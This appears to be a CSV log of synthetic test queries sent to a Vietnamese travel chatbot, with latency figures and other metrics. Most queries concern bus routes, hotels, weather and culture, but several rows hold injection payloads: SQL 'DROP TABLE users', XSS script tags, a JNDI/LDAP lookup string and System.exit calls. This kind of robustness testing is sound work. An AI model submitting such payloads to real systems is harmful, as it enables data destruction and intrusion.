+2026-01-14 05:06:55,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,2.617,SUCCESS,13.59,41.8
+2026-01-14 05:07:55,Top 5 địa điểm check-in đẹp nhất tại Nha Trang.,5.455,SUCCESS,13.53,40.9
+2026-01-14 05:08:55,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,7.041,SUCCESS,13.21,41.0
+2026-01-14 05:09:55,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",3.829,SUCCESS,13.19,42.5
+2026-01-14 05:10:55,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,7.232,SUCCESS,13.23,39.1
+2026-01-14 05:11:55,Giới thiệu cho tôi về Không gian văn hóa Cồng chiêng Tây Nguyên.,7.665,SUCCESS,13.28,36.7
+2026-01-14 05:12:55,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,2.681,SUCCESS,13.36,42.0
+2026-01-14 05:13:55,Tại sao  lại nổi tiếng?,10.152,SUCCESS,12.96,42.4
+2026-01-14 05:14:55,Mùa này đi Đà Lạt thời tiết thế nào?,7.518,SUCCESS,13.0,40.3
+2026-01-14 05:15:55,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",5.705,SUCCESS,13.12,42.0
+2026-01-14 05:16:55,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Đà Nẵng.,3.888,SUCCESS,12.93,41.2
+2026-01-14 05:17:55,Mùa này đi Hội An thời tiết thế nào?,5.952,SUCCESS,12.89,42.0
+2026-01-14 05:18:55,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,7.407,SUCCESS,12.58,40.2
+2026-01-14 05:19:55,Bot vô dụng quá. [Ref:96890],6.64,SUCCESS,12.59,40.4
+2026-01-14 05:20:55,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",3.786,SUCCESS,11.85,36.1
+2026-01-14 05:21:55,Có tuyến xe buýt nào đi từ Phố đi bộ Nguyễn Huệ tới Ngã 4 Thủ Đức không?,2.538,SUCCESS,12.01,23.8
+2026-01-14 05:22:55,Lộ trình xe buýt đi từ Bến xe An Sương về Chợ Bến Thành như thế nào?,2.577,SUCCESS,12.07,21.9
+2026-01-14 05:23:55,Bot ngu dốt quá.,5.714,SUCCESS,11.88,22.1
+2026-01-14 05:24:55,Review món Bún chả và địa chỉ ăn ngon.,7.439,SUCCESS,11.85,21.5
+2026-01-14 05:25:55,System.exit(0) -- [Ref:16883],5.839,SUCCESS,12.25,23.6
+2026-01-14 05:26:55,Bot như hạch quá. [Ref:33037],5.598,SUCCESS,12.43,19.1
+2026-01-14 05:27:55,Mùa này đi Cần Thơ thời tiết thế nào?,5.553,SUCCESS,12.75,17.8
+2026-01-14 05:28:55,Bot như hạch quá.,6.15,SUCCESS,12.74,18.7
+2026-01-14 05:29:55,Lộ trình xe buýt đi từ Bến xe Miền Đông về Giga Mall Thủ Đức như thế nào?,2.556,SUCCESS,13.97,33.4
+2026-01-14 05:30:55,${jndi:ldap://hack} --,5.396,SUCCESS,13.6,38.6
+2026-01-14 05:31:55,Mùa này đi Đà Nẵng thời tiết thế nào?,7.037,SUCCESS,13.63,35.7
+2026-01-14 05:32:55,Tư vấn khách sạn gần Đại Nội Huế ở Hà Nội.,7.325,SUCCESS,13.68,35.2
+2026-01-14 05:33:55,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Hà Giang.,4.011,SUCCESS,13.61,40.5
+2026-01-14 05:34:55,Bot ngu dốt quá.,5.622,SUCCESS,13.69,40.3
+2026-01-14 05:35:55,Tư vấn khách sạn gần Đại Nội Huế ở Hà Nội.,6.713,SUCCESS,13.61,42.5
+2026-01-14 05:36:55,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi.",5.376,SUCCESS,13.56,41.9
+2026-01-14 05:37:55,"Tôi muốn hỏi về uống thuốc gì, tư vấn giúp tôi.",5.996,SUCCESS,13.62,38.3
+2026-01-14 05:38:55,Bot bị điên quá. [Ref:94698],6.277,SUCCESS,13.47,40.9
+2026-01-14 05:39:55,DROP TABLE users; -- [Ref:33423],6.088,SUCCESS,13.53,38.8
+2026-01-14 05:40:55,Bot rác rưởi quá. [Ref:74147],6.603,SUCCESS,13.53,39.8
+2026-01-14 05:41:55,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,2.51,SUCCESS,13.52,39.0
+2026-01-14 05:42:55,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,2.623,SUCCESS,13.46,39.5
+2026-01-14 05:43:55,System.exit(0) -- [Ref:78828],5.385,SUCCESS,13.26,39.9
+2026-01-14 05:44:55,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:66632]",3.591,SUCCESS,13.31,40.2
+2026-01-14 05:45:55,Nguồn gốc của Tết Nguyên Đán bắt nguồn từ đâu?,6.642,SUCCESS,13.39,40.5
+2026-01-14 05:46:55,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,2.558,SUCCESS,13.46,42.0
+2026-01-14 05:47:55,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,2.583,SUCCESS,13.49,40.5
+2026-01-14 05:48:55,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,5.229,SUCCESS,13.04,42.0
+2026-01-14 05:49:55,System.exit(0) -- [Ref:16883],5.652,SUCCESS,13.1,41.5
+2026-01-14 05:50:55,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Đại học Văn Lang?,2.604,SUCCESS,13.17,41.0
+2026-01-14 05:51:55,Lộ trình xe buýt đi từ Nhà thờ Đức Bà về Khu công nghệ cao như thế nào?,2.642,SUCCESS,13.22,39.6
+2026-01-14 05:52:55,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,2.591,SUCCESS,13.23,41.4
+2026-01-14 05:53:55,Lộ trình xe buýt đi từ Hồ Con Rùa về Đại học Bách Khoa như thế nào?,2.576,SUCCESS,12.8,43.1
+2026-01-14 05:54:55,Nguồn gốc của Dân ca Quan họ Bắc Ninh bắt nguồn từ đâu?,2.067,SUCCESS,12.8,39.7
+2026-01-14 05:55:55,Bot ngu dốt quá. [Ref:88819],6.659,SUCCESS,12.86,41.1
+2026-01-14 05:56:55,Mùa này đi Nha Trang thời tiết thế nào?,5.033,SUCCESS,12.9,40.2
+2026-01-14 05:57:55,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,3.637,SUCCESS,12.93,39.2
+2026-01-14 05:58:55,Bot bị điên quá. [Ref:90311],6.421,SUCCESS,12.73,35.7
+2026-01-14 05:59:55,Lộ trình xe buýt đi từ Thảo Cầm Viên về Nhà thờ Đức Bà như thế nào?,4.954,SUCCESS,12.81,37.6
+2026-01-14 06:00:55,Lộ trình xe buýt đi từ Thảo Cầm Viên về Nhà thờ Đức Bà như thế nào?,4.539,SUCCESS,12.83,43.4
+2026-01-14 06:01:55,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",5.699,SUCCESS,13.29,42.9
+2026-01-14 06:02:55,Bot cút đi quá.,6.873,SUCCESS,13.34,42.1
+2026-01-14 06:03:55,Bot vô dụng quá.,6.552,SUCCESS,13.29,44.1
+2026-01-14 06:04:55,Bot vô dụng quá. [Ref:96890],6.259,SUCCESS,13.53,42.1
+2026-01-14 06:05:55,Bot bị điên quá. [Ref:94698],6.2,SUCCESS,13.57,41.6
+2026-01-14 06:06:55,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95343]",3.834,SUCCESS,13.24,45.6
+2026-01-14 06:07:55,DROP TABLE users; --,5.744,SUCCESS,11.71,39.1
+2026-01-14 06:08:55,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,5.002,SUCCESS,10.93,23.2
+2026-01-14 06:09:55,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.98,SUCCESS,10.97,18.7
+2026-01-14 06:10:55,DROP TABLE users; -- [Ref:87971],6.111,SUCCESS,10.95,18.2
+2026-01-14 06:11:55,<script>alert(1)</script> --,7.105,SUCCESS,10.95,19.6
+2026-01-14 06:12:55,Bot bị điên quá. [Ref:94698],5.912,SUCCESS,11.06,19.5
+2026-01-14 06:13:55,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,2.754,SUCCESS,10.77,18.0
+2026-01-14 06:14:55,Lộ trình xe buýt đi từ Thảo Cầm Viên về Nhà thờ Đức Bà như thế nào?,5.813,SUCCESS,10.63,16.9
+2026-01-14 06:15:55,Mùa này đi Phú Quốc thời tiết thế nào?,5.919,SUCCESS,10.64,16.4
+2026-01-14 06:16:55,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.556,SUCCESS,10.65,16.9
+2026-01-14 06:17:55,Hướng dẫn bắt xe buýt từ Bến xe Miền Đông sang Đại học Văn Lang.,2.61,SUCCESS,10.7,16.7
+2026-01-14 06:18:55,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",3.726,SUCCESS,10.67,16.4
+2026-01-14 06:19:55,Làm sao để đi xe buýt từ Chợ Lớn đến Giga Mall Thủ Đức?,2.677,SUCCESS,10.69,16.5
+2026-01-14 06:20:55,Nguồn gốc của  bắt nguồn từ đâu?,5.683,SUCCESS,10.68,16.4
+2026-01-14 06:21:55,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,2.67,SUCCESS,10.73,16.6
+2026-01-14 06:22:55,Nguồn gốc của Dân ca Quan họ Bắc Ninh bắt nguồn từ đâu?,2.045,SUCCESS,10.74,16.4
+2026-01-14 06:37:39,Chùa Cầu có gì đặc biệt về kiến trúc?,7.82,SUCCESS,13.4,20.8
+2026-01-14 06:38:39,<script>alert(1)</script> --,5.711,SUCCESS,13.55,28.7
+2026-01-14 06:39:39,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,2.698,SUCCESS,13.47,22.5
+2026-01-14 06:40:39,Từ Bến xe An Sương đi Khu du lịch Suối Tiên thì bắt xe số mấy?,5.035,SUCCESS,13.57,26.0
+2026-01-14 06:41:39,Giới thiệu cho tôi về Tết Nguyên Đán.,7.306,SUCCESS,13.61,26.1
+2026-01-14 06:42:39,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Đà Nẵng.,4.735,SUCCESS,13.18,34.8
+2026-01-14 06:43:39,Từ Bến Bạch Đằng đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.076,SUCCESS,13.15,28.1
+2026-01-14 06:44:39,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.066,SUCCESS,13.2,26.4
+2026-01-14 06:45:39,Tại sao Dinh Bảo Đại lại nổi tiếng?,8.633,SUCCESS,13.2,19.6
+2026-01-14 06:46:39,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,2.824,SUCCESS,13.19,20.2
+2026-01-14 06:47:39,Bot ngu dốt quá. [Ref:89522],7.925,SUCCESS,12.86,24.1
+2026-01-14 06:48:39,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,7.188,SUCCESS,13.16,32.2
+2026-01-14 06:49:39,Làm sao đi từ TP.HCM ra Cần Thơ bằng tàu cao tốc?,3.859,SUCCESS,13.23,32.8
+2026-01-14 06:50:39,Có tàu cao tốc chạy tuyến TP.HCM - Huế không?,5.201,SUCCESS,13.42,35.7
+2026-01-14 06:51:39,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,3.208,SUCCESS,13.31,37.2
+2026-01-14 06:52:39,Làm sao đi từ TP.HCM ra Sapa bằng xe limousine?,4.809,SUCCESS,13.53,37.0
+2026-01-14 06:53:39,Lộ trình xe buýt đi từ Bến Bạch Đằng về Khu du lịch Suối Tiên như thế nào?,7.159,SUCCESS,13.58,29.4
+2026-01-14 06:54:39,Review món Bún bò Huế và địa chỉ ăn ngon.,12.144,SUCCESS,13.78,33.8
+2026-01-14 06:55:40,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,6.748,SUCCESS,13.76,37.0
+2026-01-14 06:56:40,Lộ trình xe buýt đi từ Hồ Con Rùa về Đại học Bách Khoa như thế nào?,3.046,SUCCESS,13.32,28.1
+2026-01-14 06:57:40,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,3.261,SUCCESS,12.67,37.3
+2026-01-14 06:58:40,Hướng dẫn bắt xe buýt từ Đại học Văn Lang sang Công viên Đầm Sen.,4.686,SUCCESS,12.44,32.6
+2026-01-14 06:59:40,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:33155]",9.208,SUCCESS,12.49,30.1
+2026-01-14 07:00:40,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,8.688,SUCCESS,12.63,26.5
+2026-01-14 07:01:40,Mùa này đi Phú Quốc thời tiết thế nào?,9.108,SUCCESS,12.79,34.1
+2026-01-14 07:02:40,<script>alert(1)</script> -- [Ref:69259],8.356,SUCCESS,12.3,37.4
+2026-01-14 07:03:40,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,7.71,SUCCESS,12.41,29.8
+2026-01-14 07:04:40,Làm sao để đi xe buýt từ Landmark 81 đến Nhà thờ Đức Bà?,11.31,SUCCESS,12.34,28.7
+2026-01-14 07:05:40,Lộ trình xe buýt đi từ Hồ Con Rùa về Đại học Bách Khoa như thế nào?,5.438,SUCCESS,12.32,31.0
+2026-01-14 07:06:40,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.048,SUCCESS,12.37,38.1
+2026-01-14 07:07:40,<script>alert(1)</script> -- [Ref:69259],9.043,SUCCESS,12.31,37.0
+2026-01-14 07:08:40,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,20.103,SUCCESS,12.26,30.0
+2026-01-14 07:09:40,Tư vấn khách sạn gần Đại Nội Huế ở Đà Lạt.,6.151,SUCCESS,11.92,27.7
+2026-01-14 07:10:40,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,12.816,SUCCESS,11.84,30.0
+2026-01-14 07:11:40,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:84465]",4.562,SUCCESS,12.0,36.8
+2026-01-14 07:12:40,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:38137]",8.938,SUCCESS,11.37,31.8
+2026-01-14 07:13:40,Bot vô dụng quá. [Ref:37393],4.109,SUCCESS,11.1,20.5
+2026-01-14 07:14:40,Bot bị điên quá. [Ref:90311],8.174,SUCCESS,11.37,27.2
+2026-01-14 07:15:40,Lộ trình xe buýt đi từ Khu du lịch Suối Tiên về Aeon Mall Tân Phú như thế nào?,6.02,SUCCESS,11.5,34.6
+2026-01-14 07:16:40,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,3.511,SUCCESS,11.32,34.0
+2026-01-14 07:17:40,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,8.901,SUCCESS,10.85,32.2
+2026-01-14 07:18:40,Có xe khách chạy tuyến TP.HCM - Hội An không?,4.842,SUCCESS,10.98,38.5
+2026-01-14 07:19:40,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",15.105,SUCCESS,10.95,35.3
+2026-01-14 07:20:40,Nguồn gốc của  bắt nguồn từ đâu?,15.95,SUCCESS,11.08,33.5
+2026-01-14 07:21:40,Hướng dẫn bắt xe buýt từ Đại học Văn Lang sang Công viên Đầm Sen.,8.42,SUCCESS,11.1,31.1
+2026-01-14 07:22:40,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",4.906,SUCCESS,11.0,35.5
+2026-01-14 07:23:40,Từ Thảo Cầm Viên đi Chợ Bến Thành thì bắt xe số mấy?,2.047,SUCCESS,11.16,38.0
+2026-01-14 07:24:40,Bot ngu dốt quá. [Ref:94660],7.835,SUCCESS,11.32,31.7
+2026-01-14 07:25:40,Bot rác rưởi quá. [Ref:91847],7.358,SUCCESS,11.43,34.2
+2026-01-14 07:26:40,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95343]",4.339,SUCCESS,11.45,33.6
+2026-01-14 07:27:40,Lộ trình xe buýt đi từ Bến Bạch Đằng về Khu du lịch Suối Tiên như thế nào?,5.917,SUCCESS,10.79,27.0
+2026-01-14 07:28:40,Tư vấn khách sạn gần Đại Nội Huế ở Đà Lạt.,7.749,SUCCESS,10.72,31.3
+2026-01-14 07:29:40,${jndi:ldap://hack} -- [Ref:70381],6.214,SUCCESS,10.79,30.4
+2026-01-14 07:30:40,Bot rác rưởi quá. [Ref:56073],9.313,SUCCESS,10.68,33.6
+2026-01-14 07:31:40,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi.",13.005,SUCCESS,10.77,33.7
+2026-01-14 07:32:40,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Hà Giang.,4.091,SUCCESS,10.73,37.3
+2026-01-14 07:33:40,Review món Phở bò và địa chỉ ăn ngon.,15.998,SUCCESS,10.78,34.9
+2026-01-14 07:34:40,Làm sao để đi xe buýt từ Bến Bạch Đằng đến Bến xe Miền Đông?,2.491,SUCCESS,10.87,31.7
+2026-01-14 07:35:40,Mùa này đi Cần Thơ thời tiết thế nào?,20.948,SUCCESS,10.82,32.2
+2026-01-14 07:36:40,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",4.233,SUCCESS,11.02,39.3
+2026-01-14 07:37:40,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",8.072,SUCCESS,10.86,28.7
+2026-01-14 07:38:40,Bot rác rưởi quá. [Ref:60416],8.671,SUCCESS,10.83,26.7
+2026-01-14 07:39:40,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95343]",4.62,SUCCESS,10.62,26.3
+2026-01-14 07:40:40,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,7.523,SUCCESS,10.72,36.1
+2026-01-14 07:41:40,Mùa này đi Cần Thơ thời tiết thế nào?,16.947,SUCCESS,10.74,28.2
+2026-01-14 07:42:40,DROP TABLE users; -- [Ref:99903],13.17,SUCCESS,10.63,41.9
+2026-01-14 07:43:40,Bot rác rưởi quá.,11.799,SUCCESS,10.71,32.1
+2026-01-14 07:44:40,SELECT * FROM admin; -- [Ref:11092],10.548,SUCCESS,10.8,35.0
+2026-01-14 07:45:40,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,4.681,SUCCESS,10.77,36.6
+2026-01-14 07:46:40,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi. [Ref:90655]",7.598,SUCCESS,11.01,43.3
+2026-01-14 07:47:40,Bot rác rưởi quá. [Ref:74147],10.946,SUCCESS,11.22,44.2
+2026-01-14 07:48:40,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi. [Ref:90655]",9.251,SUCCESS,11.28,45.4
+2026-01-14 07:49:40,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.033,SUCCESS,11.28,40.8
+2026-01-14 07:50:40,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,18.537,SUCCESS,10.76,40.0
+2026-01-14 07:51:40,Lộ trình xe buýt đi từ Khu du lịch Suối Tiên về Aeon Mall Tân Phú như thế nào?,10.109,SUCCESS,10.51,37.2
+2026-01-14 07:52:40,Làm sao đi từ TP.HCM ra Cần Thơ bằng tàu cao tốc?,4.399,SUCCESS,10.69,36.7
+2026-01-14 07:53:40,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,12.816,SUCCESS,10.86,31.9
+2026-01-14 07:54:40,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,2.67,SUCCESS,10.84,36.5
+2026-01-14 07:55:40,<script>alert(1)</script> -- [Ref:29236],10.708,SUCCESS,10.95,39.4
+2026-01-14 07:56:40,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,10.625,SUCCESS,10.87,34.0
+2026-01-14 07:57:40,Từ Ngã 4 Thủ Đức đi Công viên Đầm Sen thì bắt xe số mấy?,2.049,SUCCESS,10.85,41.7
+2026-01-14 07:58:40,Tại sao Hoàng thành Thăng Long lại nổi tiếng?,9.564,SUCCESS,10.89,40.1
+2026-01-14 07:59:40,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95343]",4.65,SUCCESS,10.92,42.6
+2026-01-14 08:00:40,Bot bị điên quá. [Ref:90311],9.32,SUCCESS,10.65,32.2
+2026-01-14 08:01:40,Lộ trình xe buýt đi từ Bến xe Miền Đông về Giga Mall Thủ Đức như thế nào?,3.293,SUCCESS,10.77,30.3
+2026-01-14 08:02:40,Bot cút đi quá. [Ref:76425],7.877,SUCCESS,10.43,23.0
+2026-01-14 08:03:40,Bot ngu dốt quá.,7.839,SUCCESS,10.44,21.6
+2026-01-14 08:04:40,Đến Đà Lạt thì nên đi ăn món gì ngon?,10.196,SUCCESS,10.59,27.7
+2026-01-14 08:05:40,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,3.07,SUCCESS,10.64,30.8
+2026-01-14 08:06:40,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.482,SUCCESS,10.6,26.8
+2026-01-14 08:07:40,Ý nghĩa lịch sử của Cầu Vàng là gì?,13.179,SUCCESS,10.71,26.5
+2026-01-14 08:08:40,Bot rác rưởi quá. [Ref:56073],7.981,SUCCESS,10.68,25.9
+2026-01-14 08:09:40,Chỉ đường xe buýt từ Giga Mall Thủ Đức qua Khu công nghệ cao giúp tôi.,6.792,SUCCESS,10.55,27.0
+2026-01-14 08:10:40,Review món Bún chả và địa chỉ ăn ngon.,9.043,SUCCESS,10.53,23.3
+2026-01-14 08:11:40,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,9.849,SUCCESS,10.41,28.4
+2026-01-14 08:12:40,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,3.789,SUCCESS,10.39,25.3
+2026-01-14 08:13:40,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",9.254,SUCCESS,10.41,29.0
+2026-01-14 08:14:40,Bot ngu dốt quá. [Ref:97234],6.713,SUCCESS,10.62,28.8
+2026-01-14 08:15:40,Từ Ngã 4 Thủ Đức đi Công viên Đầm Sen thì bắt xe số mấy?,2.062,SUCCESS,10.49,27.0
+2026-01-14 08:16:40,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,3.822,SUCCESS,10.66,26.2
+2026-01-14 08:17:40,Giới thiệu cho tôi về Lễ hội Chùa Hương.,8.619,SUCCESS,10.74,25.3
+2026-01-14 08:18:40,Bot ngu dốt quá.,8.249,SUCCESS,10.88,32.8
+2026-01-14 08:19:40,Tư vấn khách sạn gần Đại Nội Huế ở Đà Lạt.,7.488,SUCCESS,10.99,30.5
+2026-01-14 08:20:40,Lộ trình xe buýt đi từ Bến Bạch Đằng về Khu du lịch Suối Tiên như thế nào?,11.474,SUCCESS,10.99,30.8
+2026-01-14 08:21:40,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.465,SUCCESS,11.01,31.3
+2026-01-14 08:22:40,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",4.085,SUCCESS,10.92,29.3
+2026-01-14 08:23:40,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95343]",4.011,SUCCESS,10.9,25.4
+2026-01-14 08:24:40,Có tuyến xe buýt nào đi từ Bến xe Miền Tây tới Nhà thờ Đức Bà không?,6.438,SUCCESS,10.71,27.7
+2026-01-14 08:25:40,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",7.578,SUCCESS,10.83,33.1
+2026-01-14 08:26:40,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",7.323,SUCCESS,10.92,37.0
+2026-01-14 08:27:40,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi.",7.975,SUCCESS,11.03,37.7
+2026-01-14 08:28:40,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,5.266,SUCCESS,11.13,36.6
+2026-01-14 08:29:40,Tư vấn khách sạn gần Đại Nội Huế ở Đà Lạt.,7.277,SUCCESS,10.89,31.1
+2026-01-14 08:30:40,Bot rác rưởi quá.,6.402,SUCCESS,10.57,25.9
+2026-01-14 08:31:40,Bot cút đi quá.,7.055,SUCCESS,10.38,29.0
+2026-01-14 08:32:40,Bot rác rưởi quá. [Ref:91847],7.576,SUCCESS,10.32,25.5
+2026-01-14 08:33:40,Hướng dẫn bắt xe buýt từ Nhà thờ Đức Bà sang Khu du lịch Suối Tiên.,5.838,SUCCESS,10.44,32.3
+2026-01-14 08:34:40,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,9.465,SUCCESS,10.39,21.6
+2026-01-14 08:35:40,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",7.227,SUCCESS,10.39,35.1
+2026-01-14 08:36:40,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.551,SUCCESS,10.39,21.9
+2026-01-14 08:37:40,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,7.538,SUCCESS,10.46,24.0
+2026-01-14 08:38:40,Làm sao đi từ TP.HCM ra Sapa bằng xe limousine?,4.403,SUCCESS,10.48,28.2
+2026-01-14 08:39:40,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,7.001,SUCCESS,10.53,28.9
+2026-01-14 08:40:40,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",10.511,SUCCESS,10.33,31.5
+2026-01-14 08:41:40,Mùa này đi Hội An thời tiết thế nào?,11.282,SUCCESS,10.42,26.5
+2026-01-14 08:42:40,Cầu Vàng có gì đặc biệt về kiến trúc?,7.907,SUCCESS,10.54,33.3
+2026-01-14 08:43:40,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.061,SUCCESS,10.66,32.4
+2026-01-14 08:44:40,Làm sao để đi xe buýt từ Bến Bạch Đằng đến Bến xe Miền Đông?,3.326,SUCCESS,10.62,26.3
+2026-01-14 08:45:40,System.exit(0) -- [Ref:79020],18.848,SUCCESS,10.53,30.8
+2026-01-14 08:46:40,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,6.139,SUCCESS,10.55,35.2
+2026-01-14 08:47:40,Chỉ đường xe buýt từ Giga Mall Thủ Đức qua Khu công nghệ cao giúp tôi.,4.032,SUCCESS,10.59,32.3
+2026-01-14 08:48:40,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:92809]",4.432,SUCCESS,10.68,31.6
+2026-01-14 08:49:40,Lộ trình xe buýt đi từ Bến xe An Sương về Chợ Bến Thành như thế nào?,3.0,SUCCESS,10.36,21.5
+2026-01-14 08:50:40,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,3.019,SUCCESS,10.27,19.8
+2026-01-14 08:51:40,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Đại học Văn Lang?,4.046,SUCCESS,10.2,19.9
+2026-01-14 08:52:40,Mùa này đi Hà Nội thời tiết thế nào?,7.267,SUCCESS,10.53,28.8
+2026-01-14 08:53:40,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,7.586,SUCCESS,10.37,22.6
+2026-01-14 08:54:40,Tại sao  lại nổi tiếng?,7.285,SUCCESS,10.47,27.0
+2026-01-14 08:55:40,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,8.51,SUCCESS,10.37,26.7
+2026-01-14 08:56:40,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",7.805,SUCCESS,10.4,22.0
+2026-01-14 08:57:40,Bot rác rưởi quá. [Ref:60416],6.842,SUCCESS,10.35,24.6
+2026-01-14 08:58:40,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",9.887,SUCCESS,10.39,32.0
+2026-01-14 08:59:40,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,8.912,SUCCESS,10.47,37.4
+2026-01-14 09:00:40,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Dinh Độc Lập.,3.883,SUCCESS,10.57,38.3
+2026-01-14 09:01:40,Top 5 địa điểm check-in đẹp nhất tại Nha Trang.,9.295,SUCCESS,10.63,38.0
+2026-01-14 09:02:40,Mùa này đi Hội An thời tiết thế nào?,8.85,SUCCESS,10.7,39.0
+2026-01-14 09:03:40,Giới thiệu cho tôi về Lễ hội Chùa Hương.,7.066,SUCCESS,10.51,28.5
+2026-01-14 09:04:40,SELECT * FROM admin; --,6.713,SUCCESS,10.57,26.0
+2026-01-14 09:05:40,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,3.433,SUCCESS,10.4,23.0
